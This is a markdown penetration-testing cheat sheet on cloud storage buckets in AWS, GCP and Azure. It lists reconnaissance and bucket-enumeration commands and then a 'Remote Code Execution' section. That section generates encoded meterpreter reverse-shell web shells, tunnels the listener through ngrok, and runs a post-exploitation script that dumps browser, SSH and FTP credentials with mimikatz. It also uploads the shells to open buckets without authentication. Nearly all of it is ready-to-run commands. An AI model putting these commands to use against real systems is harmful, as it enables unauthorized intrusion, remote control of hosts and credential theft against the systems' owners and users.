# Cloud Storage

## Check List

* [ ] _Assess that the access control configuration for the storage services is properly in place._

## Cheat Sheet

### WHOIS Lookup

#### [Host](https://linux.die.net/man/1/host)

_Domain to IP_

```bash
host $WEBSITE
```

#### [Whois](https://who.is)

_Company Info_

```bash
whois $WEBSITE
```

_IP to ASN_

```bash
whois -h whois.cymru.com -v $TARGET
```

#### [cURL](https://curl.se/)

_HTTP Headers_

```bash
curl -I $WEBSITE
```

_Check Robots_

```bash
curl $WEBSITE/robots.txt
```

### DNS Enum

#### [DNSEnum](https://github.com/fwaeytens/dnsenum)

_DNS Records_

```bash
dnsenum $WEBSITE
```

#### [Dig](https://linux.die.net/man/1/dig)

```bash
dig +short $WEBSITE
```

### Subdomain Enum

#### [SubFinder ](https://github.com/projectdiscovery/subfinder)& [ShuffleDNS](https://github.com/projectdiscovery/shuffledns)

_Subdomains_

```bash
echo "1.1.1.1" > /tmp/resolvers.txt; \
subfinder -d $WEBSITE -all | \
shuffledns -d $WEBSITE -r /tmp/resolvers.txt -mode resolve
```

### Source URLs

#### [Katana](https://github.com/projectdiscovery/katana)

GCP

```bash
katana -u $WEBSITE -jc -d 5 | grep -Eo "https?://[^ ]+storage\.googleapis\.com[^ ]*"
```

AWS

```bash
katana -u $WEBSITE -jc -d 5 | grep -Eo "https?://[^ ]+s3[^ ]+\.amazonaws\.com"
```

Azure

```bash
katana -u $WEBSITE -jc -d 5 | grep -Eo "https?://[^ ]+s3[^ ]+\.blob.core.windows\.net"
```

### Certificate Transparency

#### [Cert.sh](https://crt.sh)

```bash
curl -s "https://crt.sh/?q=%25.$WEBSITE&output=json" | jq .
```

### [Wayback Machine](https://web.archive.org/)

GCP

```bash
echo $WEBSITE | gau | grep -E "storage\.googleapis\.com|.*\.storage.googleapis.com"
```

AWS

```bash
echo $WEBSITE | gau | grep -E "s3\.[a-z0-9-]+\.amazonaws\.com|s3\.amazonaws\.com"
```

Azure

```bash
echo $WEBSITE | gau | grep -E "s3\.[a-z0-9-]+\.blob.core.windows\.net|s3\.blob.core.windows\.net"
```

#### [Nmap](https://nmap.org/)

GCP

```bash
nmap -p 80,443 \
     --script http-title,http-headers $BUCKET.storage.googleapis.com
```

AWS

```bash
nmap -p 80,443 \
     --script http-title,s3open $BUCKET.s3.amazonaws.com
```

Azure

```bash
nmap -p 80,443 \
     --script http-title,azure-enum $CONTAINER.blob.core.windows.net
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei)

```bash
nuclei -u $WEBSITE \
       -tags aws gcp azure cloud cloud-Enum aws-cloud-config azure-cloud-config 
```

### **Open Source Intelligence**

#### [Google](https://www.google.com/)

[GCP](https://cloud.google.com)

```bash
site:$WEBSITE inurl:"storage.googleapis.com" | 
site:$WEBSITE inurl:"googleusercontent.com"
```

[AWS](https://aws.amazon.com)

```bash
site:$WEBSITE inurl:"amazonaws.com" | 
site:s3.amazonaws.com $WEBSITE
```

[Azure](https://azure.microsoft.com)

```bash
site:$WEBSITE inurl:"blob.core.windows.com" | 
site:blob.core.windows.com $WEBSITE
```

#### [Shodan](https://www.shodan.io/)

```bash
shodan search net:"$TARGET/24"
```

#### [Censys](https://search.censys.io/)

```bash
services.http.response.body: {"s3.amazonaws.com", "storage.googleapis.com", "blob.core.windows.net"}
```

#### [CloudBrute](https://github.com/0xsha/CloudBrute)

GCP

```bash
wget https://raw.githubusercontent.com/RhinoSecurityLabs/GCPBucketBrute/refs/heads/master/permutations.txt \
    -O /tmp/gcp_buckets.txt
cloudbrute discover \
    -d $WEBSITE \
    -k "gcp" \
    -w /tmp/gcp_buckets.txt
```

AWS

```bash
wget https://raw.githubusercontent.com/koaj/aws-s3-bucket-wordlist/refs/heads/master/list.txt \
    -O /tmp/s3_bucket_list.txt
cloudbrute discover \
    -d $WEBSITE \
    -k "s3" \
    -w /tmp/s3_bucket_list.txt
```

Azure

```bash
wget https://raw.githubusercontent.com/Macmod/goblob/refs/heads/main/wordlists/goblob-folder-names.txt \
    -O /tmp/AzureBlob.txt
cloudbrute discover \
    -d $WEBSITE \
    -k "azure" \
    -w /tmp/AzureBlob.txt
```

#### [Nmap](https://nmap.org/)

```bash
nmap -p 80,443 \
     --script http-title,http-open-proxy,ssl-cert,http-enum,http-robots.txt,http-auth-finder,s3-buckets,s3-ls,s3-object,s3-enum,s3-brute \
     $CONTAINER.blob.core.windows.net \
     $BUCKET.storage.googleapis.com \
     $BUCKET.s3.amazonaws.com
```

### Remote Code Execution

#### [**Weevely**](https://github.com/epinna/weevely3)

_Create Web Shell PHP_

```bash
weevely generate 00980098 /tmp/unk9vvn.php
```

_Create Web Shell ASPX_

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx /tmp/unk9vvn.aspx
```

#### [**Metasploit**](https://www.metasploit.com/)

_Start Ngrok_

```bash
ngrok tcp 4444 >/dev/null 2>&1 &
```

_Define ENV Ngrok_

```bash
NGINFO=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels); \
NGHOST=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/([^"]*):.*/\1/p'); \
NGPORT=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/.*.tcp.*.ngrok.io:([^"]*).*/\1/p')
```

_Cert Spoof_

```bash
rm -rf /home/$USER/.msf4/loot/*
msfconsole -qx "
    use auxiliary/gather/impersonate_ssl;
    set RHOSTS google.com;
    run;
    exit"
```

_Post-EXP_

```bash
cat > /tmp/post-exp.rc << EOF
getprivs
getsystem
run multi/gather/firefox_creds DECRYPT=true
run multi/gather/filezilla_client_cred
run multi/gather/ssh_creds
run multi/gather/thunderbird_creds
run multi/gather/wlan_geolocate
mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
bg
EOF
```

_Generate Web shell PHP_

```bash
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         EnableStageEncoding=true \
         -f raw \
         -e php/base64 \
         -i 3 \
         -o /tmp/unk9vvn.php
sed -i "s#eval#<?php eval#g" /tmp/unk9vvn.php
sed -i "s#));#)); ?>#g" /tmp/unk9vvn.php
```

_Generate Web Shell ASP_

```bash
msfvenom -p windows/meterpreter/reverse_winhttps \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         EnableStageEncoding=true \
         -f asp > /tmp/unk9vvn.aspx
```

_Listening Metasploit PHP_

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD php/meterpreter/reverse_tcp;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

_Listening Metaploit ASP_

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD windows/meterpreter/reverse_winhttps;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

#### [**AWS S3**](https://aws.amazon.com/)

_Connection Test_

```bash
aws s3 ls s3://$BUCKET.s3.amazonaws.com --no-sign-request
```

_Upload File Testing_

```bash
aws s3 cp /tmp/unk9vvn.php s3://$BUCKET.s3.amazonaws.com --no-sign-request
```

_Success Upload File Testing_

```bash
aws s3 cp s3://$BUCKET.s3.amazonaws.com/unk9vvn.php . --no-sign-request
```

_HTTP Connection Testing_

```bash
curl -I https://$BUCKET.s3.amazonaws.com/unk9vvn.php
```

#### [GCP](https://cloud.google.com)

_Connection Test_

```bash
gsutil ls gs://$BUCKET
```

_Upload File Testing_

```bash
gsutil cp /tmp/unk9vvn.php gs://$BUCKET
```

_Success Upload File Testing_

```bash
gsutil cp gs://$BUCKET/unk9vvn.php .
```

_HTTP Connection Testing_

```bash
curl -I http://storage.googleapis.com/$BUCKET/unk9vvn.php
```

#### [Azure](https://azure.microsoft.com)

_Connection Test_

```bash
az storage blob list \
    --account-name $ACCOUNT \
    --container-name $CONTAINER \
    --output table
```

_Upload File Testing_

```bash
az storage blob upload \
    --account-name $ACCOUNT \
    --container-name $CONTAINER \
    --name unk9vvn.aspx \
    --file /tmp/unk9vvn.aspx \
    --auth-mode login
```

_Success Upload File Testing_

```bash
az storage blob download 
    --account-name $ACCOUNT \
    --container-name $CONTAINER \
    --name unk9vvn.aspx \
    --file /tmp/test_unk9vvn.aspx \
    --auth-mode login
```

_HTTP Connection Testing_

```bash
curl -I https://$ACCOUNT.blob.core.windows.net/$CONTAINER/unk9vvn.aspx
```
